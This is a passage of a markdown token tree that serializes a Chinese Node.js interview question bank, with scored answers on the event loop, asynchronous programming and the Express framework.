类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 异步编程模型：Node.js采用了事件驱动、非阻塞I/O模型，使其能够在大量连接的情况下保持高性能和稳定性。\\n\\n- 单一编程语言：Node.js使用的是JavaScript，这是一种被广大开发者所熟悉的语言，能够大大降低学习成本。\\n\\n- 开源社区活跃：Node.js有一个非常活跃的开源社区，有大量的模块可供使用，极大地提高了开发效率。\\n\\n- 跨平台性：Node.js可以在多种操作系统上运行，如Windows、Linux、macOS等。\\n\\n- 高性能：由于Node.js的非阻塞I/O模型，使其在处理大量并发请求时具有极高的性能。\\n\\n- 数据密集型应用：Node.js擅长处理数据密集型应用，如实时通信、实时流媒体、实时游戏等。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 异步编程模型：Node.js采用了事件驱动、非阻塞I/O模型，使其能够在大量连接的情况下保持高性能和稳定性。\\n\\n","task":false,"loose":true,"text":"异步编程模型：Node.js采用了事件驱动、非阻塞I/O模型，使其能够在大量连接的情况下保持高性能和稳定性。\\n","tokens":[{"type":"text","raw":"异步编程模型：Node.js采用了事件驱动、非阻塞I/O模型，使其能够在大量连接的情况下保持高性能和稳定性。\\n","text":"异步编程模型：Node.js采用了事件驱动、非阻塞I/O模型，使其能够在大量连接的情况下保持高性能和稳定性。","tokens":[{"type":"text","raw":"异步编程模型：Node.js采用了事件驱动、非阻塞I/O模型，使其能够在大量连接的情况下保持高性能和稳定性。","text":"异步编程模型：Node.js采用了事件驱动、非阻塞I/O模型，使其能够在大量连接的情况下保持高性能和稳定性。","escaped":false}]}]},{"type":"list_item","raw":"- 单一编程语言：Node.js使用的是JavaScript，这是一种被广大开发者所熟悉的语言，能够大大降低学习成本。\\n\\n","task":false,"loose":true,"text":"单一编程语言：Node.js使用的是JavaScript，这是一种被广大开发者所熟悉的语言，能够大大降低学习成本。\\n","tokens":[{"type":"text","raw":"单一编程语言：Node.js使用的是JavaScript，这是一种被广大开发者所熟悉的语言，能够大大降低学习成本。\\n","text":"单一编程语言：Node.js使用的是JavaScript，这是一种被广大开发者所熟悉的语言，能够大大降低学习成本。","tokens":[{"type":"text","raw":"单一编程语言：Node.js使用的是JavaScript，这是一种被广大开发者所熟悉的语言，能够大大降低学习成本。","text":"单一编程语言：Node.js使用的是JavaScript，这是一种被广大开发者所熟悉的语言，能够大大降低学习成本。","escaped":false}]}]},{"type":"list_item","raw":"- 开源社区活跃：Node.js有一个非常活跃的开源社区，有大量的模块可供使用，极大地提高了开发效率。\\n\\n","task":false,"loose":true,"text":"开源社区活跃：Node.js有一个非常活跃的开源社区，有大量的模块可供使用，极大地提高了开发效率。\\n","tokens":[{"type":"text","raw":"开源社区活跃：Node.js有一个非常活跃的开源社区，有大量的模块可供使用，极大地提高了开发效率。\\n","text":"开源社区活跃：Node.js有一个非常活跃的开源社区，有大量的模块可供使用，极大地提高了开发效率。","tokens":[{"type":"text","raw":"开源社区活跃：Node.js有一个非常活跃的开源社区，有大量的模块可供使用，极大地提高了开发效率。","text":"开源社区活跃：Node.js有一个非常活跃的开源社区，有大量的模块可供使用，极大地提高了开发效率。","escaped":false}]}]},{"type":"list_item","raw":"- 跨平台性：Node.js可以在多种操作系统上运行，如Windows、Linux、macOS等。\\n\\n","task":false,"loose":true,"text":"跨平台性：Node.js可以在多种操作系统上运行，如Windows、Linux、macOS等。\\n","tokens":[{"type":"text","raw":"跨平台性：Node.js可以在多种操作系统上运行，如Windows、Linux、macOS等。\\n","text":"跨平台性：Node.js可以在多种操作系统上运行，如Windows、Linux、macOS等。","tokens":[{"type":"text","raw":"跨平台性：Node.js可以在多种操作系统上运行，如Windows、Linux、macOS等。","text":"跨平台性：Node.js可以在多种操作系统上运行，如Windows、Linux、macOS等。","escaped":false}]}]},{"type":"list_item","raw":"- 高性能：由于Node.js的非阻塞I/O模型，使其在处理大量并发请求时具有极高的性能。\\n\\n","task":false,"loose":true,"text":"高性能：由于Node.js的非阻塞I/O模型，使其在处理大量并发请求时具有极高的性能。\\n","tokens":[{"type":"text","raw":"高性能：由于Node.js的非阻塞I/O模型，使其在处理大量并发请求时具有极高的性能。\\n","text":"高性能：由于Node.js的非阻塞I/O模型，使其在处理大量并发请求时具有极高的性能。","tokens":[{"type":"text","raw":"高性能：由于Node.js的非阻塞I/O模型，使其在处理大量并发请求时具有极高的性能。","text":"高性能：由于Node.js的非阻塞I/O模型，使其在处理大量并发请求时具有极高的性能。","escaped":false}]}]},{"type":"list_item","raw":"- 数据密集型应用：Node.js擅长处理数据密集型应用，如实时通信、实时流媒体、实时游戏等。","task":false,"loose":true,"text":"数据密集型应用：Node.js擅长处理数据密集型应用，如实时通信、实时流媒体、实时游戏等。","tokens":[{"type":"text","raw":"数据密集型应用：Node.js擅长处理数据密集型应用，如实时通信、实时流媒体、实时游戏等。","text":"数据密集型应用：Node.js擅长处理数据密集型应用，如实时通信、实时流媒体、实时游戏等。","tokens":[{"type":"text","raw":"数据密集型应用：Node.js擅长处理数据密集型应用，如实时通信、实时流媒体、实时游戏等。","text":"数据密集型应用：Node.js擅长处理数据密集型应用，如实时通信、实时流媒体、实时游戏等。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 15. Node.js采用哪种编程模式？它的优势是什么？\\n\\n","depth":2,"text":"15. Node.js采用哪种编程模式？它的优势是什么？","tokens":[{"type":"text","raw":"15. Node.js采用哪种编程模式？它的优势是什么？","text":"15. Node.js采用哪种编程模式？它的优势是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- Node.js采用的是事件驱动编程模式，这种模式使得Node.js能够在不需要等待I/O操作完成的情况下继续执行其他的任务。这样做的好处是可以提高系统的吞吐量，尤其是在处理高并发的网络请求时，能够大大提高响应速度。\\n\\n- 此外，Node.js还支持回调函数、Promise和async/await等不同的异步编程方式，可以根据具体的应用场景灵活选择合适的编程方式。这样做的好处是可以提高代码的可读性和可维护性，同时也能够更好地控制代码的执行流程。\\n\\n- 总的来说，Node.js的事件驱动编程模式和灵活的异步编程方式为其带来了高效、稳定和易用的优势。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Node.js采用的是事件驱动编程模式，这种模式使得Node.js能够在不需要等待I/O操作完成的情况下继续执行其他的任务。这样做的好处是可以提高系统的吞吐量，尤其是在处理高并发的网络请求时，能够大大提高响应速度。\\n\\n","task":false,"loose":true,"text":"Node.js采用的是事件驱动编程模式，这种模式使得Node.js能够在不需要等待I/O操作完成的情况下继续执行其他的任务。这样做的好处是可以提高系统的吞吐量，尤其是在处理高并发的网络请求时，能够大大提高响应速度。\\n","tokens":[{"type":"text","raw":"Node.js采用的是事件驱动编程模式，这种模式使得Node.js能够在不需要等待I/O操作完成的情况下继续执行其他的任务。这样做的好处是可以提高系统的吞吐量，尤其是在处理高并发的网络请求时，能够大大提高响应速度。\\n","text":"Node.js采用的是事件驱动编程模式，这种模式使得Node.js能够在不需要等待I/O操作完成的情况下继续执行其他的任务。这样做的好处是可以提高系统的吞吐量，尤其是在处理高并发的网络请求时，能够大大提高响应速度。","tokens":[{"type":"text","raw":"Node.js采用的是事件驱动编程模式，这种模式使得Node.js能够在不需要等待I/O操作完成的情况下继续执行其他的任务。这样做的好处是可以提高系统的吞吐量，尤其是在处理高并发的网络请求时，能够大大提高响应速度。","text":"Node.js采用的是事件驱动编程模式，这种模式使得Node.js能够在不需要等待I/O操作完成的情况下继续执行其他的任务。这样做的好处是可以提高系统的吞吐量，尤其是在处理高并发的网络请求时，能够大大提高响应速度。","escaped":false}]}]},{"type":"list_item","raw":"- 此外，Node.js还支持回调函数、Promise和async/await等不同的异步编程方式，可以根据具体的应用场景灵活选择合适的编程方式。这样做的好处是可以提高代码的可读性和可维护性，同时也能够更好地控制代码的执行流程。\\n\\n","task":false,"loose":true,"text":"此外，Node.js还支持回调函数、Promise和async/await等不同的异步编程方式，可以根据具体的应用场景灵活选择合适的编程方式。这样做的好处是可以提高代码的可读性和可维护性，同时也能够更好地控制代码的执行流程。\\n","tokens":[{"type":"text","raw":"此外，Node.js还支持回调函数、Promise和async/await等不同的异步编程方式，可以根据具体的应用场景灵活选择合适的编程方式。这样做的好处是可以提高代码的可读性和可维护性，同时也能够更好地控制代码的执行流程。\\n","text":"此外，Node.js还支持回调函数、Promise和async/await等不同的异步编程方式，可以根据具体的应用场景灵活选择合适的编程方式。这样做的好处是可以提高代码的可读性和可维护性，同时也能够更好地控制代码的执行流程。","tokens":[{"type":"text","raw":"此外，Node.js还支持回调函数、Promise和async/await等不同的异步编程方式，可以根据具体的应用场景灵活选择合适的编程方式。这样做的好处是可以提高代码的可读性和可维护性，同时也能够更好地控制代码的执行流程。","text":"此外，Node.js还支持回调函数、Promise和async/await等不同的异步编程方式，可以根据具体的应用场景灵活选择合适的编程方式。这样做的好处是可以提高代码的可读性和可维护性，同时也能够更好地控制代码的执行流程。","escaped":false}]}]},{"type":"list_item","raw":"- 总的来说，Node.js的事件驱动编程模式和灵活的异步编程方式为其带来了高效、稳定和易用的优势。","task":false,"loose":true,"text":"总的来说，Node.js的事件驱动编程模式和灵活的异步编程方式为其带来了高效、稳定和易用的优势。","tokens":[{"type":"text","raw":"总的来说，Node.js的事件驱动编程模式和灵活的异步编程方式为其带来了高效、稳定和易用的优势。","text":"总的来说，Node.js的事件驱动编程模式和灵活的异步编程方式为其带来了高效、稳定和易用的优势。","tokens":[{"type":"text","raw":"总的来说，Node.js的事件驱动编程模式和灵活的异步编程方式为其带来了高效、稳定和易用的优势。","text":"总的来说，Node.js的事件驱动编程模式和灵活的异步编程方式为其带来了高效、稳定和易用的优势。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 16. 解释一下Event Loop的工作原理？\\n\\n","depth":2,"text":"16. 解释一下Event Loop的工作原理？","tokens":[{"type":"text","raw":"16. 解释一下Event Loop的工作原理？","text":"16. 解释一下Event Loop的工作原理？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- Event Loop是Node.js实现异步编程的关键部分，它负责管理所有的事件和回调函数。\\n\\n- 当一个事件触发时，Event Loop会将相关的回调函数放入队列中等待执行。这些回调函数按照一定的优先级进行排列，一旦执行环境空闲，Event Loop就会开始执行队列中的下一个回调函数。\\n\\n- 当一个回调函数执行完毕后，Event Loop会重新检查队列，看是否有新的事件需要处理。如果有，它会将相关的回调函数放入队列中；如果没有，它则会进入等待状态，直到有新的事件发生。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Event Loop是Node.js实现异步编程的关键部分，它负责管理所有的事件和回调函数。\\n\\n","task":false,"loose":true,"text":"Event Loop是Node.js实现异步编程的关键部分，它负责管理所有的事件和回调函数。\\n","tokens":[{"type":"text","raw":"Event Loop是Node.js实现异步编程的关键部分，它负责管理所有的事件和回调函数。\\n","text":"Event Loop是Node.js实现异步编程的关键部分，它负责管理所有的事件和回调函数。","tokens":[{"type":"text","raw":"Event Loop是Node.js实现异步编程的关键部分，它负责管理所有的事件和回调函数。","text":"Event Loop是Node.js实现异步编程的关键部分，它负责管理所有的事件和回调函数。","escaped":false}]}]},{"type":"list_item","raw":"- 当一个事件触发时，Event Loop会将相关的回调函数放入队列中等待执行。这些回调函数按照一定的优先级进行排列，一旦执行环境空闲，Event Loop就会开始执行队列中的下一个回调函数。\\n\\n","task":false,"loose":true,"text":"当一个事件触发时，Event Loop会将相关的回调函数放入队列中等待执行。这些回调函数按照一定的优先级进行排列，一旦执行环境空闲，Event Loop就会开始执行队列中的下一个回调函数。\\n","tokens":[{"type":"text","raw":"当一个事件触发时，Event Loop会将相关的回调函数放入队列中等待执行。这些回调函数按照一定的优先级进行排列，一旦执行环境空闲，Event Loop就会开始执行队列中的下一个回调函数。\\n","text":"当一个事件触发时，Event Loop会将相关的回调函数放入队列中等待执行。这些回调函数按照一定的优先级进行排列，一旦执行环境空闲，Event Loop就会开始执行队列中的下一个回调函数。","tokens":[{"type":"text","raw":"当一个事件触发时，Event Loop会将相关的回调函数放入队列中等待执行。这些回调函数按照一定的优先级进行排列，一旦执行环境空闲，Event Loop就会开始执行队列中的下一个回调函数。","text":"当一个事件触发时，Event Loop会将相关的回调函数放入队列中等待执行。这些回调函数按照一定的优先级进行排列，一旦执行环境空闲，Event Loop就会开始执行队列中的下一个回调函数。","escaped":false}]}]},{"type":"list_item","raw":"- 当一个回调函数执行完毕后，Event Loop会重新检查队列，看是否有新的事件需要处理。如果有，它会将相关的回调函数放入队列中；如果没有，它则会进入等待状态，直到有新的事件发生。","task":false,"loose":true,"text":"当一个回调函数执行完毕后，Event Loop会重新检查队列，看是否有新的事件需要处理。如果有，它会将相关的回调函数放入队列中；如果没有，它则会进入等待状态，直到有新的事件发生。","tokens":[{"type":"text","raw":"当一个回调函数执行完毕后，Event Loop会重新检查队列，看是否有新的事件需要处理。如果有，它会将相关的回调函数放入队列中；如果没有，它则会进入等待状态，直到有新的事件发生。","text":"当一个回调函数执行完毕后，Event Loop会重新检查队列，看是否有新的事件需要处理。如果有，它会将相关的回调函数放入队列中；如果没有，它则会进入等待状态，直到有新的事件发生。","tokens":[{"type":"text","raw":"当一个回调函数执行完毕后，Event Loop会重新检查队列，看是否有新的事件需要处理。如果有，它会将相关的回调函数放入队列中；如果没有，它则会进入等待状态，直到有新的事件发生。","text":"当一个回调函数执行完毕后，Event Loop会重新检查队列，看是否有新的事件需要处理。如果有，它会将相关的回调函数放入队列中；如果没有，它则会进入等待状态，直到有新的事件发生。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 17. node.js的同步和异步编程是什么意思？\\n\\n","depth":2,"text":"17. node.js的同步和异步编程是什么意思？","tokens":[{"type":"text","raw":"17. node.js的同步和异步编程是什么意思？","text":"17. node.js的同步和异步编程是什么意思？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- 同步编程指的是程序按照顺序依次执行的方式。在这种方式下，程序会逐行地执行代码，并且在某条代码执行完毕之前，其他后续代码都会暂停等待。这种方式适用于那些顺序依赖性强、逻辑复杂度低的情况。\\n\\n- 而异步编程则是指程序在同一时间内可以并行执行多个任务的方式。在这种方式下，程序可以不按顺序地执行代码，并且可以在某些任务未完成时就开始执行其他任务。这种方式适用于那些顺序依赖性较弱、并发性要求较高的情况。\\n\\n- Node.js主要支持异步编程，并且通过Event Loop机制实现了高效的并发能力。然而，为了兼容其他编程风格，也支持一些同步编程的功能。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- 同步编程指的是程序按照顺序依次执行的方式。在这种方式下，程序会逐行地执行代码，并且在某条代码执行完毕之前，其他后续代码都会暂停等待。这种方式适用于那些顺序依赖性强、逻辑复杂度低的情况。\\n\\n","task":false,"loose":true,"text":"同步编程指的是程序按照顺序依次执行的方式。在这种方式下，程序会逐行地执行代码，并且在某条代码执行完毕之前，其他后续代码都会暂停等待。这种方式适用于那些顺序依赖性强、逻辑复杂度低的情况。\\n","tokens":[{"type":"text","raw":"同步编程指的是程序按照顺序依次执行的方式。在这种方式下，程序会逐行地执行代码，并且在某条代码执行完毕之前，其他后续代码都会暂停等待。这种方式适用于那些顺序依赖性强、逻辑复杂度低的情况。\\n","text":"同步编程指的是程序按照顺序依次执行的方式。在这种方式下，程序会逐行地执行代码，并且在某条代码执行完毕之前，其他后续代码都会暂停等待。这种方式适用于那些顺序依赖性强、逻辑复杂度低的情况。","tokens":[{"type":"text","raw":"同步编程指的是程序按照顺序依次执行的方式。在这种方式下，程序会逐行地执行代码，并且在某条代码执行完毕之前，其他后续代码都会暂停等待。这种方式适用于那些顺序依赖性强、逻辑复杂度低的情况。","text":"同步编程指的是程序按照顺序依次执行的方式。在这种方式下，程序会逐行地执行代码，并且在某条代码执行完毕之前，其他后续代码都会暂停等待。这种方式适用于那些顺序依赖性强、逻辑复杂度低的情况。","escaped":false}]}]},{"type":"list_item","raw":"- 而异步编程则是指程序在同一时间内可以并行执行多个任务的方式。在这种方式下，程序可以不按顺序地执行代码，并且可以在某些任务未完成时就开始执行其他任务。这种方式适用于那些顺序依赖性较弱、并发性要求较高的情况。\\n\\n","task":false,"loose":true,"text":"而异步编程则是指程序在同一时间内可以并行执行多个任务的方式。在这种方式下，程序可以不按顺序地执行代码，并且可以在某些任务未完成时就开始执行其他任务。这种方式适用于那些顺序依赖性较弱、并发性要求较高的情况。\\n","tokens":[{"type":"text","raw":"而异步编程则是指程序在同一时间内可以并行执行多个任务的方式。在这种方式下，程序可以不按顺序地执行代码，并且可以在某些任务未完成时就开始执行其他任务。这种方式适用于那些顺序依赖性较弱、并发性要求较高的情况。\\n","text":"而异步编程则是指程序在同一时间内可以并行执行多个任务的方式。在这种方式下，程序可以不按顺序地执行代码，并且可以在某些任务未完成时就开始执行其他任务。这种方式适用于那些顺序依赖性较弱、并发性要求较高的情况。","tokens":[{"type":"text","raw":"而异步编程则是指程序在同一时间内可以并行执行多个任务的方式。在这种方式下，程序可以不按顺序地执行代码，并且可以在某些任务未完成时就开始执行其他任务。这种方式适用于那些顺序依赖性较弱、并发性要求较高的情况。","text":"而异步编程则是指程序在同一时间内可以并行执行多个任务的方式。在这种方式下，程序可以不按顺序地执行代码，并且可以在某些任务未完成时就开始执行其他任务。这种方式适用于那些顺序依赖性较弱、并发性要求较高的情况。","escaped":false}]}]},{"type":"list_item","raw":"- Node.js主要支持异步编程，并且通过Event Loop机制实现了高效的并发能力。然而，为了兼容其他编程风格，也支持一些同步编程的功能。","task":false,"loose":true,"text":"Node.js主要支持异步编程，并且通过Event Loop机制实现了高效的并发能力。然而，为了兼容其他编程风格，也支持一些同步编程的功能。","tokens":[{"type":"text","raw":"Node.js主要支持异步编程，并且通过Event Loop机制实现了高效的并发能力。然而，为了兼容其他编程风格，也支持一些同步编程的功能。","text":"Node.js主要支持异步编程，并且通过Event Loop机制实现了高效的并发能力。然而，为了兼容其他编程风格，也支持一些同步编程的功能。","tokens":[{"type":"text","raw":"Node.js主要支持异步编程，并且通过Event Loop机制实现了高效的并发能力。然而，为了兼容其他编程风格，也支持一些同步编程的功能。","text":"Node.js主要支持异步编程，并且通过Event Loop机制实现了高效的并发能力。然而，为了兼容其他编程风格，也支持一些同步编程的功能。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 18. 解释一下Node.js的Express框架及其主要组件?\\n\\n","depth":2,"text":"18. 解释一下Node.js的Express框架及其主要组件?","tokens":[{"type":"text","raw":"18. 解释一下Node.js的Express框架及其主要组件?","text":"18. 解释一下Node.js的Express框架及其主要组件?","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（3 分）\\n\\n","depth":4,"text":"解答（3 分）","tokens":[{"type":"text","raw":"解答（3 分）","text":"解答（3 分）","escaped":false}]},{"type":"list","raw":"- Express是一个基于Node.js的web应用程序框架，它可以帮助开发人员快速构建Web服务。它的主要组件包括：\\n\\n- Router：路由器，用于定义路由规则，根据URL的不同路径映射到不同的处理器。\\n\\n- Middleware：中间件，用于拦截HTTP请求，并对其进行预处理或后处理。\\n\\n- View engine：视图引擎，用于渲染HTML模板。\\n\\n- Body-parser：用于解析POST请求体中的内容，如表单数据和JSON数据。\\n\\n- Cors：跨域资源共享模块，允许客户端向不同域名的服务器发起请求。\\n\\n- Static：静态文件服务器，用于托管静态文件，如图片、CSS和JavaScript文件。\\n\\n- Express还支持自定义错误处理器、HTTP中间件等功能，使得开发者可以轻松地搭建出高质量的Web服务。","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- Express是一个基于Node.js的web应用程序框架，它可以帮助开发人员快速构建Web服务。它的主要组件包括：\\n\\n","task":false,"loose":true,"text":"Express是一个基于Node.js的web应用程序框架，它可以帮助开发人员快速构建Web服务。它的主要组件包括：\\n","tokens":[{"type":"text","raw":"Express是一个基于Node.js的web应用程序框架，它可以帮助开发人员快速构建Web服务。它的主要组件包括：\\n","text":"Express是一个基于Node.js的web应用程序框架，它可以帮助开发人员快速构建Web服务。它的主要组件包括：","tokens":[{"type":"text","raw":"Express是一个基于Node.js的web应用程序框架，它可以帮助开发人员快速构建Web服务。它的主要组件包括：","text":"Express是一个基于Node.js的web应用程序框架，它可以帮助开发人员快速构建Web服务。它的主要组件包括：","escaped":false}]}]},{"type":"list_item","raw":"- Router：路由器，用于定义路由规则，根据URL的不同路径映射到不同的处理器。\\n\\n","task":false,"loose":true,"text":"Router：路由器，用于定义路由规则，根据URL的不同路径映射到不同的处理器。\\n","tokens":[{"type":"text","raw":"Router：路由器，用于定义路由规则，根据URL的不同路径映射到不同的处理器。\\n","text":"Router：路由器，用于定义路由规则，根据URL的不同路径映射到不同的处理器。","tokens":[{"type":"text","raw":"Router：路由器，用于定义路由规则，根据URL的不同路径映射到不同的处理器。","text":"Router：路由器，用于定义路由规则，根据URL的不同路径映射到不同的处理器。","escaped":false}]}]},{"type":"list_item","raw":"- Middleware：中间件，用于拦截HTTP请求，并对其进行预处理或后处理。\\n\\n","task":false,"loose":true,"text":"Middleware：中间件，用于拦截HTTP请求，并对其进行预处理或后处理。\\n","tokens":[{"type":"text","raw":"Middleware：中间件，用于拦截HTTP请求，并对其进行预处理或后处理。\\n","text":"Middleware：中间件，用于拦截HTTP请求，并对其进行预处理或后处理。","tokens":[{"type":"text","raw":"Middleware：中间件，用于拦截HTTP请求，并对其进行预处理或后处理。","text":"Middleware：中间件，用于拦截HTTP请求，并对其进行预处理或后处理。","escaped":false}]}]},{"type":"list_item","raw":"- View engine：视图引擎，用于渲染HTML模板。\\n\\n","task":false,"loose":true,"text":"View engine：视图引擎，用于渲染HTML模板。\\n","tokens":[{"type":"text","raw":"View engine：视图引擎，用于渲染HTML模板。\\n","text":"View engine：视图引擎，用于渲染HTML模板。","tokens":[{"type":"text","raw":"View engine：视图引擎，用于渲染HTML模板。","text":"View engine：视图引擎，用于渲染HTML模板。","escaped":false}]}]},{"type":"list_item","raw":"- Body-parser：用于解析POST请求体中的内容，如表单数据和JSON数据。\\n\\n","task":false,"loose":true,"text":"Body-parser：用于解析POST请求体中的内容，如表单数据和JSON数据。\\n","tokens":[{"type":"text","raw":"Body-parser：用于解析POST请求体中的内容，如表单数据和JSON数据。\\n","text":"Body-parser：用于解析POST请求体中的内容，如表单数据和JSON数据。","tokens":[{"type":"text","raw":"Body-parser：用于解析POST请求体中的内容，如表单数据和JSON数据。","text":"Body-parser：用于解析POST请求体中的内容，如表单数据和JSON数据。","escaped":false}]}]},{"type":"list_item","raw":"- Cors：跨域资源共享模块，允许客户端向不同域名的服务器发起请求。\\n\\n","task":false,"loose":true,"text":"Cors：跨域资源共享模块，允许客户端向不同域名的服务器发起请求。\\n","tokens":[{"type":"text","raw":"Cors：跨域资源共享模块，允许客户端向不同域名的服务器发起请求。\\n","text":"Cors：跨域资源共享模块，允许客户端向不同域名的服务器发起请求。","tokens":[{"type":"text","raw":"Cors：跨域资源共享模块，允许客户端向不同域名的服务器发起请求。","text":"Cors：跨域资源共享模块，允许客户端向不同域名的服务器发起请求。","escaped":false}]}]},{"type":"list_item","raw":"- Static：静态文件服务器，用于托管静态文件，如图片、CSS和JavaScript文件。\\n\\n","task":false,"loose":true,"text":"Static：静态文件服务器，用于托管静态文件，如图片、CSS和JavaScript文件。\\n","tokens":[{"type":"text","raw":"Static：静态文件服务器，用于托管静态文件，如图片、CSS和JavaScript文件。\\n","text":"Static：静态文件服务器，用于托管静态文件，如图片、CSS和JavaScript文件。","tokens":[{"type":"text","raw":"Static：静态文件服务器，用于托管静态文件，如图片、CSS和JavaScript文件。","text":"Static：静态文件服务器，用于托管静态文件，如图片、CSS和JavaScript文件。","escaped":false}]}]},{"type":"list_item","raw":"- 